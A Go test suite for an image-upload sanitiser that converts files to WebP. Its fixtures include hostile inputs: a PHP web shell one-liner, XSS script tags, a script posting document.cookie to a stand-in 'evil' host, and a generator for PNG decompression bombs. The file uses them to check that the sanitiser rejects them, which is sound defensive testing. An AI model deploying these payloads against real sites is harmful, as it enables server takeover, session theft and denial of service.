package imagesafe

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/binary"
	"errors"
	"hash/crc32"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"sync"
	"testing"

	"golang.org/x/image/webp"
)

func sample(w, h int) image.Image {
	im := image.NewNRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			im.Set(x, y, color.NRGBA{uint8(x * 7), uint8(y * 5), uint8(x + y), 255})
		}
	}
	return im
}

func jpegBytes(t *testing.T, w, h int) []byte {
	var b bytes.Buffer
	if err := jpeg.Encode(&b, sample(w, h), nil); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func pngBytes(t *testing.T, w, h int) []byte {
	var b bytes.Buffer
	if err := png.Encode(&b, sample(w, h)); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func mustOK(t *testing.T, in []byte, wantFmt string) *Result {
	t.Helper()
	r, err := Process(context.Background(), in)
	if err != nil {
		t.Fatalf("expected success, got %v", err)
	}
	if r.InputFormat != wantFmt {
		t.Fatalf("format %q want %q", r.InputFormat, wantFmt)
	}
	if !(len(r.WebP) > 12 && string(r.WebP[:4]) == "RIFF" && string(r.WebP[8:12]) == "WEBP") {
		t.Fatal("output is not WebP")
	}
	// Output must decode, with the same dimensions.
	im, err := webp.Decode(bytes.NewReader(r.WebP))
	if err != nil {
		t.Fatalf("output does not decode: %v", err)
	}
	if im.Bounds().Dx() != r.Width || im.Bounds().Dy() != r.Height {
		t.Fatal("dimension mismatch")
	}
	return r
}

func mustFail(t *testing.T, name string, in []byte, want error) {
	t.Helper()
	r, err := Process(context.Background(), in)
	if err == nil {
		t.Fatalf("%s: accepted (out %d bytes)", name, len(r.WebP))
	}
	if !errors.Is(err, want) {
		t.Fatalf("%s: got %v want %v", name, err, want)
	}
}

func TestValidFormatsReencodedToWebP(t *testing.T) {
	mustOK(t, jpegBytes(t, 64, 48), "jpeg")
	mustOK(t, pngBytes(t, 64, 48), "png")
	w := mustOK(t, pngBytes(t, 32, 32), "png")
	mustOK(t, w.WebP, "webp") // WebP in -> WebP out
}

func TestRejectsNonImagesWhateverTheyAreCalled(t *testing.T) {
	cases := map[string][]byte{
		"svg":        []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`),
		"html":       []byte(`<!doctype html><html><script>alert(1)</script></html>`),
		"js":         []byte(`alert(document.cookie)`),
		"php":        []byte("<?php system($_GET['c']); ?>"),
		"php-in-png": append([]byte("GIF89a"), []byte("<?php system($_GET['c']); ?>")...),
		"elf":        append([]byte("\x7fELF\x02\x01\x01"), make([]byte, 64)...),
		"exe":        append([]byte("MZ\x90\x00"), make([]byte, 64)...),
		"zip":        append([]byte("PK\x03\x04"), make([]byte, 64)...),
		"gif":        append([]byte("GIF89a\x01\x00\x01\x00"), make([]byte, 20)...),
		"pdf":        []byte("%PDF-1.7\n"),
		"riff-wav":   append([]byte("RIFF\x24\x00\x00\x00WAVEfmt "), make([]byte, 20)...),
	}
	for n, b := range cases {
		mustFail(t, n, b, ErrType)
	}
	mustFail(t, "empty", nil, ErrEmpty)
}

func TestFakeWebPWithHTMLOrJS(t *testing.T) {
	// Valid WebP signature, hostile body.
	body := []byte(`<html><script>fetch('//evil/'+document.cookie)</script></html>`)
	fake := append([]byte("RIFF"), 0, 0, 0, 0)
	fake = append(fake, []byte("WEBPVP8 ")...)
	fake = append(fake, body...)
	mustFail(t, "fake-webp", fake, ErrCorrupt)
	// Valid JPEG signature, junk after it.
	mustFail(t, "fake-jpeg", append([]byte{0xFF, 0xD8, 0xFF, 0xE0}, body...), ErrCorrupt)
	// Valid PNG signature, junk after it.
	mustFail(t, "fake-png", append([]byte("\x89PNG\r\n\x1a\n"), body...), ErrCorrupt)
}

func TestPayloadAppendedToValidImageIsDropped(t *testing.T) {
	evil := []byte(`<script>alert(1)</script><?php system($_GET['c']);?>`)
	for name, base := range map[string][]byte{"png": pngBytes(t, 40, 40), "jpeg": jpegBytes(t, 40, 40)} {
		in := append(append([]byte{}, base...), evil...)
		r := mustOK(t, in, name)
		if bytes.Contains(r.WebP, []byte("<script")) || bytes.Contains(r.WebP, []byte("<?php")) {
			t.Fatalf("%s: payload survived re-encoding", name)
		}
	}
}

func TestEXIFAndGPSStripped(t *testing.T) {
	j := jpegBytes(t, 40, 30)
	exif := []byte("Exif\x00\x00MM\x00\x2a\x00\x00\x00\x08\x00\x01\x01\x12\x00\x03\x00\x00\x00\x01\x00\x06\x00\x00\x00\x00\x00\x00" +
		"GPSLatitudeRef=N;GPS-SECRET-48.8584;Make=SecretCam")
	seg := append([]byte{0xFF, 0xE1}, 0, 0)
	binary.BigEndian.PutUint16(seg[2:], uint16(len(exif)+2))
	seg = append(seg, exif...)
	withExif := append(append(append([]byte{}, j[:2]...), seg...), j[2:]...)
	if !bytes.Contains(withExif, []byte("GPS-SECRET")) {
		t.Fatal("test setup broken")
	}
	r := mustOK(t, withExif, "jpeg")
	for _, s := range []string{"GPS-SECRET", "SecretCam", "Exif", "GPSLatitude"} {
		if bytes.Contains(r.WebP, []byte(s)) {
			t.Fatalf("metadata %q leaked into output", s)
		}
	}
	// Orientation 6 (rotate 90 CW) is applied before stripping: 40x30 -> 30x40.
	if r.Width != 30 || r.Height != 40 {
		t.Fatalf("orientation not applied: %dx%d", r.Width, r.Height)
	}
}

func TestCorruptedAndTruncated(t *testing.T) {
	j, p := jpegBytes(t, 80, 80), pngBytes(t, 80, 80)
	mustFail(t, "jpeg-trunc", j[:len(j)/3], ErrCorrupt)
	mustFail(t, "png-trunc", p[:len(p)/2], ErrCorrupt)
	bad := append([]byte{}, p...)
	for i := 40; i < len(bad)-20; i += 7 {
		bad[i] ^= 0xFF
	}
	mustFail(t, "png-garbage", bad, ErrCorrupt)
}

func TestOversizedFile(t *testing.T) {
	big := append(pngBytes(t, 10, 10), make([]byte, MaxBytes)...)
	mustFail(t, "5MB+", big, ErrTooLarge)
	if _, err := ReadLimited(bytes.NewReader(make([]byte, MaxBytes+1))); !errors.Is(err, ErrTooLarge) {
		t.Fatalf("ReadLimited: %v", err)
	}
	if b, err := ReadLimited(bytes.NewReader(make([]byte, MaxBytes))); err != nil || len(b) != MaxBytes {
		t.Fatalf("exactly 5MB must pass the size gate: %v", err)
	}
}

// pngClaiming builds a tiny, valid-looking PNG whose header claims huge
// dimensions, with a real zlib stream of zeros (a classic decompression bomb).
func pngClaiming(w, h uint32, rows bool) []byte {
	var out bytes.Buffer
	out.WriteString("\x89PNG\r\n\x1a\n")
	chunk := func(typ string, data []byte) {
		var l [4]byte
		binary.BigEndian.PutUint32(l[:], uint32(len(data)))
		out.Write(l[:])
		out.WriteString(typ)
		out.Write(data)
		c := crc32.NewIEEE()
		c.Write([]byte(typ))
		c.Write(data)
		binary.BigEndian.PutUint32(l[:], c.Sum32())
		out.Write(l[:])
	}
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:], w)
	binary.BigEndian.PutUint32(ihdr[4:], h)
	ihdr[8], ihdr[9] = 1, 0 // 1-bit grayscale
	chunk("IHDR", ihdr)
	var z bytes.Buffer
	zw := zlib.NewWriter(&z)
	if rows {
		row := make([]byte, 1+(w+7)/8)
		for i := uint32(0); i < h; i++ {
			zw.Write(row)
		}
	}
	zw.Close()
	chunk("IDAT", z.Bytes())
	chunk("IEND", nil)
	return out.Bytes()
}

func TestDecompressionBombs(t *testing.T) {
	// 30000x30000 1-bit: ~112 MB of zeros that deflate to a few hundred KB.
	bomb := pngClaiming(30000, 30000, true)
	if len(bomb) > MaxBytes {
		t.Skipf("bomb too big for this test (%d)", len(bomb))
	}
	t.Logf("bomb file: %d bytes claiming 30000x30000", len(bomb))
	mustFail(t, "bomb-30000", bomb, ErrDimensions)
	mustFail(t, "bomb-header-only", pngClaiming(65535, 65535, false), ErrDimensions)
	mustFail(t, "pixels>16MP", pngClaiming(5000, 5000, true), ErrDimensions) // 25 MP, each side < 8192
	mustFail(t, "side>8192", pngClaiming(9000, 10, true), ErrDimensions)
	mustFail(t, "zero-dim", pngClaiming(0, 10, false), ErrCorrupt)
}

func TestConcurrentUploadsAreBounded(t *testing.T) {
	in := pngBytes(t, 300, 300)
	var wg sync.WaitGroup
	var mu sync.Mutex
	ok, busy := 0, 0
	for i := 0; i < 40; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := Process(context.Background(), in)
			mu.Lock()
			defer mu.Unlock()
			switch {
			case err == nil:
				ok++
			case errors.Is(err, ErrBusy), errors.Is(err, ErrTimeout):
				busy++
			default:
				t.Errorf("unexpected: %v", err)
			}
		}()
	}
	wg.Wait()
	if ok == 0 || ok+busy != 40 {
		t.Fatalf("ok=%d busy=%d", ok, busy)
	}
	if len(slots) != 0 {
		t.Fatalf("%d processing slots leaked", len(slots))
	}
	t.Logf("40 concurrent: %d processed, %d refused as busy", ok, busy)
}
